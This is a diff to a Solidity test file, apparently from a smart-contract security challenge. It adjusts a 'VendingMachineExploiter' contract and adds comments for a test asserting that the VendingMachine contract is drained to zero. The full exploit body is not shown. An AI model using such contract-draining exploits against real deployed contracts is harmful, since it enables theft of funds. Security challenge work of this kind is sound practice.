@@ -31,8 +31,11 @@ contract VendingMachineTest is BaseTest {
         uint256 initialPlayerBalance = player.balance;
         uint256 initialVendingMachineBalance = address(vendingMachine).balance;
 
-        VendingMachineExploiter exploiter = new VendingMachineExploiter{value: 1 ether}(vendingMachine);
+        // deploy the VendingMachineExploiter contract
+        VendingMachineExploiter exploiter = new VendingMachineExploiter{value: 0.1 ether}(vendingMachine);
         vm.label(address(exploiter), "VendingMachineExploiter");
+
+        // start the exploit process
         exploiter.exploit();
 
         // send back all the funds to the player
@@ -40,6 +43,7 @@ contract VendingMachineTest is BaseTest {
 
         vm.stopPrank();
 
+        // Assert that we have drained the `VendingMachine` contract
         assertEq(player.balance, initialPlayerBalance + initialVendingMachineBalance);
         assertEq(address(vendingMachine).balance, 0 ether);
     }
@@ -63,7 +67,7 @@ contract VendingMachineExploiter {
         // you could go into Out of Gas exception
         // In a real life scenario the best thing would be to match the victim's balance
         // to withdraw everything with just two call
-        victim.deposit{value: 0.1 ether}();
+        victim.deposit{value: msg.value}();
     }
 
     function exploit() external {
